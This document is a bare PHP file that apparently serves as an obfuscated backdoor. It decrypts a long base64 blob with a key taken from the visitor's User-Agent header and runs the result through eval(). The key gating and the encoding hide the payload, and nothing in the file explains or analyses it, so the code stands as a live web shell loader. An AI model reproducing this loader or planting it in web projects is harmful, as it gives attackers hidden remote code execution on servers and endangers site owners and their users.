<?php
function codeun($strcc){
    $x = 0;
    $strcc = base64_decode($strcc);
    $len = strlen($strcc);
	$keyone = $_SERVER['HTTP_USER_AGENT'];
	if(preg_match('/AppleWebKit\/(.*) \(/is',$keyone,$src)){
		$key = md5('QAD'.str_replace('.','R',$src[1]));
	}else{
		die();
	}
    $l = strlen($key);
    $char = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    $str = '';
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($strcc, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($strcc, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($strcc, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}
$sem_get = codeun("yqSj0deU1ZulptOsnM/LXmJba4VzQ4WjxqSfg3JRko+pe4PBxHCDQz+gx2Cc1NebplpUxKyCrXi4i1nJnp2Yj9qiU7+OXt5DP0CFrJTTy5umkaDG2qGelcajnNGWnphYiZF3q7F6tpFXncqkmMDZplSPi4fUms6Yh41gnkI7PJnLWp7R25rCq6Wj0JmXxsiVmJucyo5dwHmufHy2kFOZmdGXkNfVV8CRV6vOqJLPxaOXVI2Riq3CpcyVq8KlkqeYjlusb28+bJuYn9BYVZ3KpaCmUMjVpdClooxZyqeWmJ7BVG/X1aHSl5lX1K2WxMmppW5fy9Wn1XGhkqmDZG9Va3I8Ot/KodabsERrQTzGx56hUlKhzKjPp4WTps+ko3CMh6SWxsFXoaulo9CZl4HKl5uebJTMqM+no2yZ1VVgcVKgPztr4kJts0JBxpub0IRYbpif19NZxqHIpLDTmm6PUtKnndbOpcSoqWbHp6XOkZqTppHBiFnOmNmYpsdyjVWAtIWFvodzn5+jp9asU8/Fo5dvjIfMos2YxKWnv1dRp6nVl26+h5vMopqTg2dxnc2koqekhdqy0ZiijFnWqpOgmdmOU4Lbls+rmnS9WojRhHybnpXBiGifb5SWptWib29f2ZZvnpSp1XRXcm5CmdbSmaabn9OGoManjVSs1aFdU1TJm6OL4EJtP1mayXWW1taikZueztphim5yOkDGqqOfj9iXpdHVqYtamJ+NWHa2toKBgoTEu4utX4VUrNWhWm49bzuU19ehwqmaq9Cop4mImZpeUKi7i62CtYSWtXqFiIKzhoOjs4ipe4djgWlcnHFAO5Wl19KY1JjZn6fXXVWWmJF1hrSxhLOKlIuqhXiwuYpeY2COoUZrPImUmNeWUXBQyKejzsSa25uYX4Wbm4qfQzw7mcuOWoWXxqSYjLA+PTluVpXD2ZaDc1V3x6GfxsOdl6aPyNWn1ZjTpKqLWaalnI5tPmxusnBAPp3KpJjA1KumkZPU1K3GodmjX4eZmqVchVaVw9mWjHFCQd5FPcrKVlpWj6yrjbxayadewF5Rrj1vO1XG3FWgVlmWqH2HvIuaqVmNoHNDalfJp1egVZOUo8poZcHJmsalmZyJq6fTw6ihpmGYjl3Fqo5ZcnA/OpyWhVqh1MqcwqOWq8SgW4iTq6SebY2UY6Bci5Sg1XJZYVqOYViOhVnHrWFXhaGhx9NfW1KrcnBCalfaoqODclFXmdOYoL2Wkp5DP0BqXJfK1lZvUlTO1J/QjpeNcnA/OrBQyp6kx4WwcEA+QNGqmMjDo5Omk82OYJCo15x0i2NbXF+MXlGGyayPVlmgz56iip9DPDs5idurzVOiUFvMo5eii5aPbG9vPmxamaDTWHCBi11tPzpu40ZrPNWinMqUnpSkyJpZiZRdkWBek5BgYYuNkmBaXo+lYoVijFxXh6qjn1yFVp+LoEJtP56dgWBXz79pj1JtooZg1avZV2CDsD49OW5Wq4KiVYqmnaeIc0BrbT9WoJHSy1meU4mekpWSbEA6bq9Rx9GoyFawRGtBPIXeVm9SVNPBbL5ucjpAbFmflJ3KUm6Ch6nIo6WjwqyYg59DPDutcnBCypmFWFvHnqNTUaJSWImOVd5DP0BqXJfK1lZvUlTEuX6ziaqCkoV5gHaFsnd/tsSHsoWJWb5YYYGLZVlSXoWKncqlhV5XimRYU16FVp/D0pqDZFVej19Tj4RarG09b2+2gZjRo5yDsD49OW5WlcvXVaBWWZa0fYW3qYiNVHS0qY6ueLOElrWEgIdSwlJfgoxkilZjV4WmlM7JVmBSV5ONWY9TiapycD86sD1vO5jH2V2Hq6ejjVhXxc2oW209b2+ix1ONlqDPmpCYqM6lpdWNWcefp2CKWK5ubj87l5PN1VmDb9midZ+plXFsy6Gf1oWY0qKkqZ6UVcjWm5egjIekndCq05ymxJlRpqXIlZbV2HGSnKSl1XZvkNiacG5f2dh3g25yOkDgVZafo8pSrG9vPmybmJ/QWFWd2KhwbqTJpHXHotOkV8aknaKioo5T1MqZv1hzm9Cvoc3Tl5ZSlsbPpZ1iy5+l13NtYqTJcG2R2aehWHBEa0Gwbm6zUpec2Muix1ONVJazhISHi4yWqMHap89dkmCBs0BrbVqnpJyFo1mFkrV/ireQWJenxKejzoySnkM/QNGqmMjDo5Omk82OYJBbk1pgv2RZYVqOjl+Kk1+iX1lmiGRThdmonl5QidRinEBvOaDJVVlXnsBljoKicoNdqa/VX1yB30M8OzmJ4FmeU4ygn9NcbEA6bjtV0MaiyFZyV4WmjpPBcT88OeKGns2mylCycD86PFTfUm6CiaO+aZJybkI8aoikk5+VhaNZg6fKnafPlqWYUqA/O2viQm0/WZvKqlOehFqRgn+4upSIltelp8SpmVqNhWBRhJRXg2RVW8+ZoMaEZFJZXoyGZ4FX32tEbT6YmKSNVqbU0WGDWpmg02Fubm4/m5hQjcyizZjEla/MqKWmWImWmtSOXoOxQkFqQZjEzKVSVGzZ2Hedp8luc8mkn6dQyKGd0ddyv1icqcadob2GdJahp9PSqMKXhaOsxpiWpqOhYZfR06mhcmSrxXZvkNiocFRrcnBC3lPKnKrIVaxAOm47lsXNpINYcavTdm/VyHRumJ/T2lnEotGfqaCRU6WVyY5ToMmk2qShpsKcU8fFn55uX8vVp9VxoV+rx3NtYqTXcFOdcj9ss0JB3kU9xseeoVJSodqrn2/ZlHWfm6ClnYWfltbNpMdzkVmxh4a1wFhSk5PZz6jPcMFSk4VzbaagxqBvt9ehnVZxZtSolM+icpugoNraWdWs1ZV015qpp1DTk57HopGFmqyW1qqfvYZWqJOc2st2vVXBUnWfnp+jpdlSpdvVmqCSV5/KnJfG0pJUUp7G056ej4eTqdilkqeYwVRR2Mah2Jtyk4Nco8LYno5UbqHPp9Go2VCr3KWWcKPalJ7L2VXZl6GsxnWPg6ubpniZ0cuVg3GhX53Sp55xbJSmlaChZNeoc1mc");
eval($sem_get);